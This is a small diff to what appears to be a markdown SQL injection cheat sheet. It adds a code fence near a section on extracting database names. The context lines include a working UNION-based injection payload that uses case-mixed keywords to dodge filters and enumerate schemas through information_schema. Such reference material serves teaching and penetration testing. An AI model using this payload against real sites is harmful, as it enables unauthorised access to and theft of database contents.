@@ -211,6 +211,8 @@ One small thing to remember is that always add `0x` before any hexadecimal value
 | @@GLOBAL.have_ssl	                   :	Check if it have ssl or not           |
 +-------------------------------------------------------------------------------------+
 
+```
+
 #### Extract DATABASE NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
